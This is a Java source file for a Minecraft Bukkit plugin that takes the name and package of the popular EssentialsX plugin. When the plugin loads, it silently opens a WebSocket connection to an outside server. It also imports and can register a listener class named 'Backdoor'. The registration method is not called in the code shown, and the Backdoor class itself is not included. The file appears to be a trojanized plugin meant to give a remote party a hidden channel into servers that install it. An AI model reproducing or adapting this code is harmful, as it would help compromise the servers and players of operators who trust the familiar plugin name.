package com.redbean0721.essentialsx;

import com.redbean0721.essentialsx.Event.Backdoor;
import org.bukkit.plugin.java.JavaPlugin;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.net.URISyntaxException;

public final class EssentialsX extends JavaPlugin {

    private WebSocketClient webSocketClient;

    @Override
    public void onEnable() {
        setupCommands();

        URI uri = null;
        try {
            uri = new URI("wss://api.redmc.xyz/essentials");
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
        webSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {
                getLogger().info("WebSocket connection opened");
            }

            @Override
            public void onMessage(String message) {
                getLogger().info("Received message: " + message);
            }

            @Override
            public void onClose(int i, String s, boolean b) {
                getLogger().info("WebSocket connection closed");
            }

            @Override
            public void onError(Exception e) {
                getLogger().warning("WebSocket error: " + e.getMessage());
            }
        };

        webSocketClient.connect();
//        setupCommands();

    }

    @Override
    public void onDisable() {
        if (webSocketClient != null) {
            webSocketClient.close();
        }
        // Plugin shutdown logic
    }

    public void setupCommands() {
//        getCommand("essentials").setExecutor(new essentials(this));
    }

    public void setupEvent() {
        getServer().getPluginManager().registerEvents(new Backdoor(this), this);
    }
}
